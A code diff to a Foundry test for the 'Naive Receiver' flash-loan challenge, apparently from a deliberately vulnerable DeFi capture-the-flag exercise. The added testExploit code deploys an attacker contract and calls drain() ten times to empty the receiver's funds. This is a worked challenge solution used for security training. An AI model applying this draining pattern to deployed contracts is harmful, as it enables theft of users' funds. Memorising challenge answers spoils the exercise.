@@ -8,6 +8,7 @@ import {Vm} from "forge-std/Vm.sol";
 
 import {FlashLoanReceiver} from "../../../Contracts/naive-receiver/FlashLoanReceiver.sol";
 import {NaiveReceiverLenderPool} from "../../../Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
+import {NaiveReceiverAttacker} from "../../../Contracts/naive-receiver/NaiveReceiverAttacker.sol";
 
 contract NaiveReceiver is DSTest {
     Vm internal immutable vm = Vm(HEVM_ADDRESS);
@@ -17,6 +18,7 @@ contract NaiveReceiver is DSTest {
 
     Utilities internal utils;
     NaiveReceiverLenderPool internal naiveReceiverLenderPool;
+    NaiveReceiverAttacker internal naiveReceiverAttacker;
     FlashLoanReceiver internal flashLoanReceiver;
     address payable internal user;
     address payable internal attacker;
@@ -53,6 +55,23 @@ contract NaiveReceiver is DSTest {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        vm.startPrank(attacker);
+        naiveReceiverAttacker = new NaiveReceiverAttacker(
+            address(naiveReceiverLenderPool),
+            address(flashLoanReceiver)
+        );
+        naiveReceiverAttacker.drain();
+        naiveReceiverAttacker.drain();
+        naiveReceiverAttacker.drain();
+        naiveReceiverAttacker.drain();
+        naiveReceiverAttacker.drain();
+        naiveReceiverAttacker.drain();
+        naiveReceiverAttacker.drain();
+        naiveReceiverAttacker.drain();
+        naiveReceiverAttacker.drain();
+        naiveReceiverAttacker.drain();
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         testAfter();
